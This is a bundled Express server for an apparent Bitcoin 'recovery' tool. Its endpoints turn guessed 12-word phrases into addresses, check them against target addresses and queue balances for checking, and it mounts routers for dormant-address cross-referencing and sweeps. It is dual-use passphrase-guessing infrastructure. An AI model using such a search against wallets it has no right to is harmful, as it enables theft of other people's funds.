      error: "Failed to poll pantheon"
    });
  }
});
router3.post("/assess", isAuthenticated, validateInput(targetSchema), async (req, res) => {
  try {
    const result = await olympusClient2.getZeusAssessment(
      req.body.target,
      req.body.context
    );
    res.json(result);
  } catch (error) {
    console.error("[Olympus] Assess error:", error);
    res.status(500).json({
      error: "Failed to get assessment"
    });
  }
});
router3.get("/status", isAuthenticated, async (req, res) => {
  try {
    const status = await olympusClient2.getStatus();
    res.json(status);
  } catch (error) {
    console.error("[Olympus] Status error:", error);
    res.status(500).json({
      error: "Failed to get status"
    });
  }
});
var godNameSchema = z5.string().min(1).max(50).regex(/^[a-zA-Z_]+$/, "Invalid god name format");
router3.get("/god/:godName/status", isAuthenticated, async (req, res) => {
  try {
    const godNameResult = godNameSchema.safeParse(req.params.godName);
    if (!godNameResult.success) {
      res.status(400).json({ error: "Invalid god name format" });
      return;
    }
    const status = await olympusClient2.getGodStatus(req.params.godName);
    res.json(status);
  } catch (error) {
    console.error("[Olympus] God status error:", error);
    res.status(404).json({
      error: `God ${req.params.godName} not found`
    });
  }
});
router3.post("/god/:godName/assess", isAuthenticated, validateInput(targetSchema), async (req, res) => {
  try {
    const godNameResult = godNameSchema.safeParse(req.params.godName);
    if (!godNameResult.success) {
      res.status(400).json({ error: "Invalid god name format" });
      return;
    }
    const result = await olympusClient2.getGodAssessment(
      req.params.godName,
      req.body.target,
      req.body.context
    );
    res.json(result);
  } catch (error) {
    console.error("[Olympus] God assess error:", error);
    res.status(500).json({
      error: "Failed to get god assessment"
    });
  }
});
var warTargetSchema = z5.object({
  target: z5.string().min(1, "Target is required").max(500, "Target too long").regex(/^[a-zA-Z0-9\s\-_.,;:!?()]+$/, "Target contains invalid characters")
});
router3.post("/war/blitzkrieg", isAuthenticated, validateInput(warTargetSchema), async (req, res) => {
  try {
    console.log(`[Olympus] User ${req.user?.claims?.sub} declared blitzkrieg on: ${req.body.target}`);
    const result = await olympusClient2.declareBlitzkrieg(req.body.target);
    res.json(result);
  } catch (error) {
    console.error("[Olympus] Blitzkrieg error:", error);
    res.status(500).json({
      error: "Failed to declare blitzkrieg"
    });
  }
});
router3.post("/war/siege", isAuthenticated, validateInput(warTargetSchema), async (req, res) => {
  try {
    console.log(`[Olympus] User ${req.user?.claims?.sub} declared siege on: ${req.body.target}`);
    const result = await olympusClient2.declareSiege(req.body.target);
    res.json(result);
  } catch (error) {
    console.error("[Olympus] Siege error:", error);
    res.status(500).json({
      error: "Failed to declare siege"
    });
  }
});
router3.post("/war/hunt", isAuthenticated, validateInput(warTargetSchema), async (req, res) => {
  try {
    console.log(`[Olympus] User ${req.user?.claims?.sub} declared hunt on: ${req.body.target}`);
    const result = await olympusClient2.declareHunt(req.body.target);
    res.json(result);
  } catch (error) {
    console.error("[Olympus] Hunt error:", error);
    res.status(500).json({
      error: "Failed to declare hunt"
    });
  }
});
router3.post("/war/end", isAuthenticated, async (req, res) => {
  try {
    console.log(`[Olympus] User ${req.user?.claims?.sub} ended war mode`);
    const result = await olympusClient2.endWar();
    res.json(result);
  } catch (error) {
    console.error("[Olympus] End war error:", error);
    res.status(500).json({
      error: "Failed to end war"
    });
  }
});
router3.get("/chat/recent", isAuthenticated, async (req, res) => {
  try {
    const backendUrl = process.env.PYTHON_BACKEND_URL || "http://localhost:5001";
    const response = await fetch(`${backendUrl}/olympus/pantheon/chat/recent`, {
      method: "GET",
      headers: { "Content-Type": "application/json" }
    });
    if (!response.ok) {
      throw new Error(`Python backend returned ${response.status}`);
    }
    const data = await response.json();
    res.json(Array.isArray(data) ? data : data.messages || []);
  } catch (error) {
    console.error("[Olympus] Recent chat error:", error);
    res.json([]);
  }
});
router3.get("/debates/active", isAuthenticated, async (req, res) => {
  try {
    const backendUrl = process.env.PYTHON_BACKEND_URL || "http://localhost:5001";
    const response = await fetch(`${backendUrl}/olympus/pantheon/debates/active`, {
      method: "GET",
      headers: { "Content-Type": "application/json" }
    });
    if (!response.ok) {
      throw new Error(`Python backend returned ${response.status}`);
    }
    const data = await response.json();
    res.json(Array.isArray(data) ? data : data.debates || []);
  } catch (error) {
    console.error("[Olympus] Active debates error:", error);
    res.json([]);
  }
});
var olympus_default = router3;

// server/routes.ts
init_balance_queue_integration();
init_schema();
init_replitAuth();
init_ocean_session_manager();
init_auto_cycle_manager();
init_search_coordinator();
import { randomUUID as randomUUID7 } from "crypto";
var strictLimiter3 = rateLimit8({
  windowMs: 60 * 1e3,
  max: 5,
  message: { error: "Rate limit exceeded. Please try again later." },
  standardHeaders: true,
  legacyHeaders: false
});
function mapQIGToLegacyScore(pureScore) {
  return {
    contextScore: 0,
    eleganceScore: Math.round(pureScore.quality * 100),
    typingScore: Math.round(pureScore.phi * 100),
    totalScore: Math.round(pureScore.quality * 100)
  };
}
autoCycleManager.setOnCycleCallback(async (addressId, address) => {
  console.log(`[AutoCycle] Starting session for address: ${address.slice(0, 16)}...`);
  oceanSessionManager.setAddressIdMapping(address, addressId);
  await oceanSessionManager.startSession(address);
});
async function registerRoutes(app2) {
  app2.get("/favicon.ico", (req, res) => {
    res.redirect(301, "/favicon.png");
  });
  const { db: db2 } = await Promise.resolve().then(() => (init_db(), db_exports));
  const authEnabled = !!db2;
  if (authEnabled) {
    await setupAuth(app2);
    console.log("[Auth] Replit Auth enabled");
    app2.get("/api/auth/user", isAuthenticated, async (req, res) => {
      try {
        const { getCachedUser: getCachedUser2 } = await Promise.resolve().then(() => (init_replitAuth(), replitAuth_exports));
        const cachedUser = getCachedUser2(req.user);
        if (cachedUser) {
          const { cachedAt: _cachedAt, ...userResponse } = cachedUser;
          return res.json(userResponse);
        }
        const userId = req.user.claims.sub;
        const user = await storage.getUser(userId);
        if (user) {
          req.user.cachedProfile = {
            ...user,
            cachedAt: Date.now()
          };
        }
        res.json(user);
      } catch (error) {
        console.error("Error fetching user:", error);
        res.status(500).json({ message: "Failed to fetch user" });
      }
    });
  } else {
    console.log("[Auth] Replit Auth disabled (no DATABASE_URL) - recovery tool accessible without login");
    app2.get("/api/auth/user", (req, res) => {
      res.status(503).json({
        message: "Authentication unavailable - database not provisioned. Please provision a PostgreSQL database to enable Replit Auth."
      });
    });
    app2.get("/api/login", (req, res) => {
      res.status(503).json({
        message: "Authentication unavailable - database not provisioned. Please provision a PostgreSQL database to enable Replit Auth."
      });
    });
    app2.get("/api/logout", (req, res) => {
      res.status(503).json({
        message: "Authentication unavailable - database not provisioned."
      });
    });
  }
  app2.use("/api/auth", authRouter);
  app2.use("/api/consciousness", consciousnessRouter);
  app2.use("/api/near-misses", nearMissRouter);
  app2.use("/api/attention-metrics", attentionMetricsRouter);
  app2.use("/api/ucp", ucpRouter);
  app2.use("/api/balance", balanceRouter);
  app2.use("/api", searchRouter);
  app2.use("/api/format", formatRouter);
  app2.use("/api/ocean", oceanRouter);
  app2.use("/api/recovery", recoveryRouter);
  app2.use("/api/unified-recovery", unifiedRecoveryRouter);
  app2.use("/api/recoveries", recoveriesRouter);
  app2.use("/api/balance-hits", balanceHitsRouter);
  app2.use("/api/balance-addresses", balanceAddressesRouter);
  app2.use("/api/balance-monitor", balanceMonitorRouter);
  app2.use("/api/balance-queue", balanceQueueRouter);
  app2.use("/api/blockchain-api", blockchainApiRouter);
  app2.use("/api/dormant-crossref", dormantCrossRefRouter);
  app2.use("/api/basin-sync", basinSyncRouter);
  app2.use("/api/geometric-discovery", geometricDiscoveryRouter);
  app2.use("/api/sweeps", sweepsRouter);
  app2.use("/api", adminRouter);
  app2.use("/api/olympus", olympus_default);
  app2.use("/api/observer", observer_routes_default);
  app2.use("/api/telemetry", router);
  console.log("[Routes] All sub-routers mounted");
  app2.get("/api/verify-crypto", (req, res) => {
    try {
      const result = verifyBrainWallet();
      res.json(result);
    } catch (error) {
      res.status(500).json({ success: false, error: error.message });
    }
  });
  app2.post("/api/test-phrase", strictLimiter3, async (req, res) => {
    try {
      const validation = testPhraseRequestSchema.safeParse(req.body);
      if (!validation.success) {
        return res.status(400).json({
          error: validation.error.errors[0].message
        });
      }
      const { phrase } = validation.data;
      const address = generateBitcoinAddress(phrase);
      const pureQIG = scorePhraseQIG(phrase);
      const qigScore = mapQIGToLegacyScore(pureQIG);
      queueAddressForBalanceCheck(phrase, "test-phrase", qigScore.totalScore >= 75 ? 5 : 1);
      const targetAddresses = await storage.getTargetAddresses();
      const matchedAddress = targetAddresses.find((t) => t.address === address);
      const match = !!matchedAddress;
      if (qigScore.totalScore >= 75) {
        const candidate = {
          id: randomUUID7(),
          phrase,
          address,
          score: qigScore.totalScore,
          qigScore,
          testedAt: (/* @__PURE__ */ new Date()).toISOString()
        };
        await storage.addCandidate(candidate);
      }
      res.json({
        phrase,
        address,
        match,
        matchedAddress: matchedAddress?.label || matchedAddress?.address,
        score: qigScore.totalScore,
        qigScore
      });
    } catch (error) {
      if (error instanceof CryptoValidationError) {
        return res.status(400).json({ error: error.message });
      }
      res.status(500).json({ error: error.message });
    }
  });
  app2.post("/api/batch-test", strictLimiter3, async (req, res) => {
    try {
      const validation = batchTestRequestSchema.safeParse(req.body);
      if (!validation.success) {
        return res.status(400).json({
          error: validation.error.errors[0].message
        });
      }
      const { phrases } = validation.data;
      const results = [];
      const candidates = [];
      let highPhiCount = 0;
      const targetAddresses = await storage.getTargetAddresses();
      for (const phrase of phrases) {
        const words = phrase.trim().split(/\s+/);
        if (words.length !== 12) {
          continue;
        }
        const address = generateBitcoinAddress(phrase);
        const pureQIG = scorePhraseQIG(phrase);
        const qigScore = mapQIGToLegacyScore(pureQIG);
        queueAddressForBalanceCheck(phrase, "batch-test", qigScore.totalScore >= 75 ? 5 : 1);
        const matchedAddress = targetAddresses.find((t) => t.address === address);
        if (matchedAddress) {
          return res.json({
            found: true,
            phrase,
            address,
            matchedAddress: matchedAddress.label || matchedAddress.address,
            score: qigScore.totalScore
          });
        }
        if (qigScore.totalScore >= 75) {
          const candidate = {
            id: randomUUID7(),
            phrase,
            address,
            score: qigScore.totalScore,
            qigScore,
            testedAt: (/* @__PURE__ */ new Date()).toISOString()
          };
          candidates.push(candidate);
          await storage.addCandidate(candidate);
          highPhiCount++;
        }
        results.push({
          phrase,
          address,
          score: qigScore.totalScore
        });
      }
      res.json({
        tested: results.length,
        highPhiCandidates: highPhiCount,
        candidates
      });
    } catch (error) {
      if (error instanceof CryptoValidationError) {
        return res.status(400).json({ error: error.message });
      }
      res.status(500).json({ error: "An internal error occurred" });
    }
  });
  searchCoordinator.start();
  const httpServer = createServer(app2);
  const { WebSocketServer } = await import("ws");
  const wss = new WebSocketServer({ server: httpServer, path: "/ws/basin-sync" });
  wss.on("connection", (ws2) => {
    const peerId = `peer-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`;
    console.log(`[BasinSync WS] New connection: ${peerId}`);
    const activeOcean = oceanSessionManager.getActiveAgent();
    if (activeOcean) {
      const coordinator = activeOcean.getBasinSyncCoordinator();
      if (coordinator) {
        coordinator.registerPeer(peerId, "observer", ws2);
      }
    }
    ws2.on("message", async (data) => {
      try {
        const message = JSON.parse(data.toString());
        const currentOcean = oceanSessionManager.getActiveAgent();
        if (!currentOcean) return;
        const coordinator = currentOcean.getBasinSyncCoordinator();
        if (!coordinator) return;
        if (message.type === "heartbeat") {
          coordinator.updatePeerLastSeen(peerId);
        } else if (message.type === "basin-delta" && message.data) {
          await coordinator.receiveFromPeer(peerId, message.data);
        } else if (message.type === "set-mode" && message.mode) {
          coordinator.registerPeer(peerId, message.mode, ws2);
        }
      } catch (err) {
        console.error("[BasinSync WS] Message parse error:", err);
      }
    });
    ws2.on("close", () => {
      console.log(`[BasinSync WS] Connection closed: ${peerId}`);
      const currentOcean = oceanSessionManager.getActiveAgent();
      if (currentOcean) {
        const coordinator = currentOcean.getBasinSyncCoordinator();
        if (coordinator) {
          coordinator.unregisterPeer(peerId);
        }
      }
    });
    ws2.on("error", (err) => {
      console.error(`[BasinSync WS] Error for ${peerId}:`, err);
    });
  });
  console.log("[BasinSync] WebSocket server initialized on /ws/basin-sync");
  return httpServer;
}

// server/vite.ts
import express from "express";
import fs18 from "fs";
import path18 from "path";
import { createServer as createViteServer, createLogger } from "vite";

// vite.config.ts
import { defineConfig } from "vite";
import react from "@vitejs/plugin-react";
import path17 from "path";
import runtimeErrorOverlay from "@replit/vite-plugin-runtime-error-modal";
var vite_config_default = defineConfig({
  plugins: [
    react(),
    runtimeErrorOverlay(),
    ...process.env.NODE_ENV !== "production" && process.env.REPL_ID !== void 0 ? [
      await import("@replit/vite-plugin-cartographer").then(
        (m) => m.cartographer()
      ),
      await import("@replit/vite-plugin-dev-banner").then(
        (m) => m.devBanner()
      )
    ] : []
  ],
  resolve: {
    alias: {
      "@": path17.resolve(import.meta.dirname, "client", "src"),
      "@shared": path17.resolve(import.meta.dirname, "shared"),
      "@assets": path17.resolve(import.meta.dirname, "attached_assets")
    }
  },
  root: path17.resolve(import.meta.dirname, "client"),
  build: {
    outDir: path17.resolve(import.meta.dirname, "dist/public"),
    emptyOutDir: true
  },
  server: {
    fs: {
      strict: true,
      deny: ["**/.*"]
    }
  }
});

// server/vite.ts
import { nanoid as nanoid4 } from "nanoid";
var viteLogger = createLogger();
function log(message, source = "express") {
  const formattedTime = (/* @__PURE__ */ new Date()).toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "2-digit",
    second: "2-digit",
    hour12: true
  });
  console.log(`${formattedTime} [${source}] ${message}`);
}
async function setupVite(app2, server) {
  const serverOptions = {
    middlewareMode: true,
    hmr: { server },
    allowedHosts: true
  };
  const vite = await createViteServer({
    ...vite_config_default,
    configFile: false,
    customLogger: {
      ...viteLogger,
      error: (msg, options) => {
        viteLogger.error(msg, options);
        process.exit(1);
      }
    },
    server: serverOptions,
    appType: "custom"
  });
  app2.use(vite.middlewares);
  app2.use("*", async (req, res, next) => {
    const url = req.originalUrl;
    try {
      const clientTemplate = path18.resolve(
        import.meta.dirname,
        "..",
        "client",
        "index.html"
      );
      let template = await fs18.promises.readFile(clientTemplate, "utf-8");
      template = template.replace(
        `src="/src/main.tsx"`,
        `src="/src/main.tsx?v=${nanoid4()}"`
      );
      const page = await vite.transformIndexHtml(url, template);
      res.status(200).set({ "Content-Type": "text/html" }).end(page);
    } catch (e) {
      vite.ssrFixStacktrace(e);
      next(e);
    }
  });
}
function serveStatic(app2) {
  const distPath = path18.resolve(import.meta.dirname, "public");
  if (!fs18.existsSync(distPath)) {
    throw new Error(
      `Could not find the build directory: ${distPath}, make sure to build the client first`
    );
  }
  app2.use(express.static(distPath));
  app2.use("*", (_req, res) => {
    res.sendFile(path18.resolve(distPath, "index.html"));
  });
}

// server/index.ts
init_db();
init_ocean_qig_backend_adapter();
init_geometric_memory();
init_ocean_constellation();
init_vocabulary_tracker();
init_balance_queue_integration();
init_ocean_agent();
init_qig_universal();
import { spawn } from "child_process";
import path19 from "path";

// server/trace-middleware.ts
import { randomUUID as randomUUID8 } from "crypto";
function traceIdMiddleware(req, res, next) {
  const incomingTraceId = req.headers["x-trace-id"];
  const traceId = incomingTraceId || randomUUID8();
  req.traceId = traceId;
  res.setHeader("X-Trace-ID", traceId);
  const method = req.method;
  const path20 = req.path;
  const timestamp2 = (/* @__PURE__ */ new Date()).toISOString();
  console.log(`[${timestamp2}] [${traceId}] ${method} ${path20}`);
  next();
}

// server/index.ts
var pythonSyncInterval = null;
async function syncProbesToPython() {
  try {
    const allProbes = geometricMemory.getAllProbes();
    const highPhiProbes = allProbes.filter((p) => p.phi >= 0.5).sort((a, b) => b.phi - a.phi).slice(0, 500);
    if (highPhiProbes.length === 0) {
      console.log("[PythonSync] No high-\u03A6 probes to sync");
      return;
    }
    const probesForPython = highPhiProbes.map((p) => ({
      input: p.input,
      phi: p.phi,
      basinCoords: p.coordinates
    }));
    const searchHistory = getSearchHistory().slice(-50).map((s) => ({
      timestamp: s.timestamp,
      phi: s.phi,
      kappa: s.kappa,
      regime: s.regime,
      basinCoordinates: s.basinCoordinates,
      hypothesis: s.hypothesis
    }));
    const conceptHistory = getConceptHistory().slice(-30).map((c) => ({
      timestamp: c.timestamp,
      // Convert Map to Record for JSON serialization
      concepts: Object.fromEntries(c.concepts),
      dominantConcept: c.dominantConcept,
      entropy: c.entropy
    }));
    const temporalState = {
      searchHistory,
      conceptHistory
    };
    const result = await oceanQIGBackend.syncFromNodeJS(probesForPython, temporalState);
    console.log(`[PythonSync] Synced ${result.imported}/${highPhiProbes.length} probes to Python`);
    if (result.temporalImported) {
      console.log(`[PythonSync] 4D temporal state synced to Python: ${searchHistory.length} search, ${conceptHistory.length} concept states`);
    }
  } catch (error) {
    console.error("[PythonSync] Error syncing to Python:", error);
  }
}
async function syncFromPythonToNodeJS() {
  try {
    const result = await oceanQIGBackend.syncToNodeJS();
    const basins = result.basins;
    if (basins.length === 0) return;
    if (result.consciousness4DAvailable) {
      if (result.phiTemporalAvg && result.phiTemporalAvg > 0) {
        console.log(`[PythonSync] 4D consciousness from Python: phi_temporal_avg=${result.phiTemporalAvg.toFixed(3)}`);
      }
      if (result.searchHistory && result.searchHistory.length > 0) {
        let imported = 0;
        for (const state of result.searchHistory) {
          const existingHistory = getSearchHistory();
          const exists = existingHistory.some(
            (s) => Math.abs(s.timestamp - state.timestamp) < 1e3
            // within 1 second
          );
          if (!exists) {
            recordSearchState({
              timestamp: state.timestamp,
              phi: state.phi,
              kappa: state.kappa,
              regime: state.regime,
              basinCoordinates: state.basinCoordinates || [],
              hypothesis: state.hypothesis
            });
            imported++;
          }
        }
        if (imported > 0) {
          console.log(`[PythonSync] Imported ${imported} search states from Python for 4D consciousness`);
        }
      }
    }
    let added = 0;
    let prioritized = 0;
    let maxPhi = 0;
    const getPriority = (phi) => {
      if (phi >= 0.9) return 10;
      if (phi >= 0.85) return 8;
      if (phi >= 0.7) return 6;
      return 3;
    };
    for (const basin of basins) {
      if (basin.phi > maxPhi) {
        maxPhi = basin.phi;
      }
      const existing = geometricMemory.getAllProbes().find((p) => p.input === basin.input);
      if (!existing && basin.phi >= 0.5 && basin.basinCoords.length > 0) {
        geometricMemory.recordProbe(
          basin.input,
          {
            phi: basin.phi,
            kappa: basin.phi * 64,
            // approximate kappa
            regime: basin.phi > 0.7 ? "geometric" : "linear",
            basinCoordinates: basin.basinCoords,
            ricciScalar: 0,
            fisherTrace: basin.phi
          },
          "python-qig"
        );
        added++;
      }
      if (basin.phi >= 0.7) {
        const priority = getPriority(basin.phi);
        const result2 = queueAddressForBalanceCheck(
          basin.input,
          "python-high-phi",
          priority
        );
        if (result2 && (result2.compressedQueued || result2.uncompressedQueued)) {
          prioritized++;
          if (basin.phi >= 0.9) {
            console.log(`[PythonSync] \u{1F3AF} HIGH-\u03A6: "${basin.input.substring(0, 30)}..." \u03A6=${basin.phi.toFixed(3)} \u2192 priority ${priority}`);
          }
        }
      }
    }
    if (added > 0 || prioritized > 0) {
      console.log(`[PythonSync] Added ${added} new probes, prioritized ${prioritized} high-\u03A6 for balance check`);
      if (maxPhi >= 0.7) {
        console.log(`[PythonSync] \u{1F3AF} Highest Python \u03A6: ${maxPhi.toFixed(3)} - addresses prioritized for checking`);
      }
      oceanConstellation.refreshTokenWeightsFromGeometricMemory();
    }
    const episodesUpdated = oceanAgent.updateEpisodesWithPythonPhi(
      basins.map((b) => ({ input: b.input, phi: b.phi }))
    );
    if (episodesUpdated > 0) {
      console.log(`[PythonSync] \u{1F4C8} Updated ${episodesUpdated} episodes with pure Python \u03A6 values`);
    }
  } catch (error) {
    console.error("[PythonSync] Error syncing from Python:", error);
  }
}
function refreshVocabularyWeights() {
  oceanConstellation.refreshTokenWeightsFromGeometricMemory();
}
async function syncVocabularyToPython() {
  try {
    if (!oceanQIGBackend.available()) {
      console.log("[PythonSync] Skipping vocabulary sync - Python backend not available");
      return;
    }
    const observations = await vocabularyTracker.exportForTokenizer();
    if (observations.length === 0) {
      console.log("[PythonSync] No vocabulary observations to sync");
      return;
    }
    const result = await oceanQIGBackend.updateVocabulary(observations);
    if (result.totalVocab > 0) {
      console.log(`[PythonSync] Vocabulary synced: ${result.newTokens} new entries, ${result.totalVocab} total`);
      try {
        const status = await oceanQIGBackend.getVocabularyStatus();
        console.log(`[PythonSync] Basin vocabulary: ${status.vocabSize} entries, ${status.highPhiCount} high-\u03A6, avg \u03A6=${status.avgPhi.toFixed(3)}`);
      } catch (statusError) {
        console.warn("[PythonSync] Could not get vocabulary status for verification");
      }
    } else {
      console.warn("[PythonSync] Vocabulary sync returned empty result - encoder may not be ready");
    }
  } catch (error) {
    console.error("[PythonSync] Error syncing vocabulary to Python:", error?.message || error);
  }
}
function startPythonSync() {
  if (pythonSyncInterval) return;
  pythonSyncInterval = setInterval(async () => {
    if (oceanQIGBackend.available()) {
      await syncFromPythonToNodeJS();
      await syncVocabularyToPython();
    }
    refreshVocabularyWeights();
  }, 6e4);
  refreshVocabularyWeights();
  setTimeout(async () => {
    if (oceanQIGBackend.available()) {
      await syncVocabularyToPython();
    }
  }, 5e3);
  console.log("[PythonSync] Started periodic sync (every 60s) with vocabulary refresh and basin encoder sync");
}
function startPythonBackend() {
  const pythonPath = process.env.PYTHON_PATH || "python3";
  const scriptPath = path19.join(process.cwd(), "qig-backend", "ocean_qig_core.py");
  console.log("[PythonQIG] Starting Python QIG Backend...");
  const pythonProcess = spawn(pythonPath, [scriptPath], {
    cwd: path19.join(process.cwd(), "qig-backend"),
    stdio: ["ignore", "pipe", "pipe"],
    detached: false
  });
  pythonProcess.stdout?.on("data", (data) => {
    const output = data.toString().trim();
    if (output) {
      console.log(`[PythonQIG] ${output}`);
    }
  });
  pythonProcess.stderr?.on("data", (data) => {
    const output = data.toString().trim();
    if (output && !output.includes("WARNING: This is a development server")) {
      console.error(`[PythonQIG] ${output}`);
    }
  });
  pythonProcess.on("close", (code) => {
    console.log(`[PythonQIG] Process exited with code ${code}`);
    if (code !== 0) {
      console.log("[PythonQIG] Will restart in 5 seconds...");
      setTimeout(() => startPythonBackend(), 5e3);
    }
  });
  pythonProcess.on("error", (err) => {
    console.error("[PythonQIG] Failed to start:", err.message);
  });
  setTimeout(async () => {
    const isAvailable = await oceanQIGBackend.checkHealthWithRetry(5, 2e3);
    if (isAvailable) {
      console.log("[PythonQIG] Backend ready, syncing geometric memory...");
      await syncProbesToPython();
      startPythonSync();
    } else {
      console.warn("[PythonQIG] Backend not available after retries - will retry on next sync cycle");
    }
  }, 3e3);
}
process.on("uncaughtException", (err) => {
  if (err.message?.includes("Cannot set property message") || err.message?.includes("ErrorEvent")) {
    console.error("[DB] Database connection error (will retry):", err.message);
    return;
  }
  console.error("[FATAL] Uncaught exception:", err);
  setTimeout(() => process.exit(1), 1e3);
});
process.on("unhandledRejection", (reason, promise) => {
  console.error("[WARN] Unhandled rejection at:", promise, "reason:", reason);
});
if (pool) {
  pool.on("error", (err) => {
    console.error("[DB] Pool error (connection will be recreated):", err.message);
  });
}
var app = express2();
var isDev = process.env.NODE_ENV === "development";
app.use(helmet({
  contentSecurityPolicy: false,
  // Disabled - recharts requires eval()
  crossOriginEmbedderPolicy: false,
  crossOriginOpenerPolicy: false,
  crossOriginResourcePolicy: false,
  hsts: isDev ? false : {
    maxAge: 31536e3,
    includeSubDomains: true,
    preload: true
  },
  noSniff: true,
  referrerPolicy: { policy: "strict-origin-when-cross-origin" }
}));
app.use(express2.json({
  verify: (req, _res, buf) => {
    req.rawBody = buf;
  }
}));
app.use(express2.urlencoded({ extended: false }));
var allowedOrigins = [
  process.env.FRONTEND_URL || "http://localhost:5173",
  "http://localhost:5000",
  "http://localhost:3000",
  "http://127.0.0.1:5000",
  "http://127.0.0.1:5173",
  "http://127.0.0.1:3000"
];
function isReplitOrigin(origin) {
  return origin.endsWith(".replit.dev") || origin.endsWith(".repl.co") || origin.includes(".picard.replit.dev");
}
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (!origin || allowedOrigins.includes(origin) || isReplitOrigin(origin)) {
    res.setHeader("Access-Control-Allow-Origin", origin || "*");
    res.setHeader("Access-Control-Allow-Credentials", "true");
    res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, PATCH, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Trace-ID");
    res.setHeader("Access-Control-Expose-Headers", "X-Trace-ID, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset");
    if (req.method === "OPTIONS") {
      return res.sendStatus(204);
    }
  } else {
    console.warn(`[CORS] Blocked request from origin: ${origin}`);
  }
  next();
});
app.use(traceIdMiddleware);
app.use((req, res, next) => {
  const start = Date.now();
  const path20 = req.path;
  let capturedJsonResponse = void 0;
  const originalResJson = res.json;
  res.json = function(bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };
  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path20.startsWith("/api")) {
      const quietEndpoints = [
        "/api/investigation/status",
        "/api/ocean/neurochemistry",
        "/api/ocean/cycles",
        "/api/candidates"
      ];
      if (quietEndpoints.some((ep) => path20.startsWith(ep)) && req.method === "GET") {
        return;
      }
      let logLine = `${req.method} ${path20} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      }
      if (logLine.length > 200) {
        logLine = logLine.slice(0, 199) + "\u2026";
      }
      log(logLine);
    }
  });
  next();
});
(async () => {
  const server = await registerRoutes(app);
  app.use((err, _req, res, _next) => {
    const status = err.status || err.statusCode || 500;
    const message = err.message || "Internal Server Error";
    res.status(status).json({ message });
    throw err;
  });
  if (app.get("env") === "development") {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }
  const port = parseInt(process.env.PORT || "5000", 10);
  server.listen({
    port,
    host: "0.0.0.0",
    reusePort: true
  }, () => {
    log(`serving on port ${port}`);
    startPythonBackend();
  });
})();
